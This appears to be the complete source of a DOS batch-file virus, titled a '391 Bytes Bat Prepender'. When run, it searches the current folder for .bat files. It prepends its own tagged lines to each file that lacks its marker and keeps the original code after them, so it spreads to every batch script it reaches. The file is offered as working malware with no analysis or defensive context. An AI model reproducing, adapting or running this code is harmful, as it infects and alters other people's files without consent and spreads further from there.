REM 391 Bytes Bat Prepender
@echo off%CW%%y0%
if '%1' == '' goto c%y0%
find "CW" <%1 >nul%y0%
if not errorlevel 1 goto e%y0%
if exist %0.bat goto b%y0%
set f=%0%y0%
goto i%y0%
:b %y0%
set f=%0.bat%y0%
ren %1 vir.tmp%y0%
set v1=n%y0%
find "y0"<%f% >>%1
echo :d>>%1%y0%
type vir.tmp >>%1%y0%
echo :e>>%1%y0%
del vir.tmp%y0t%
goto e%y0%
:c %y0%
for %%a in (*.bat) do call %0 %%a%y0%
goto d%y0%
:d
echo host file
:e
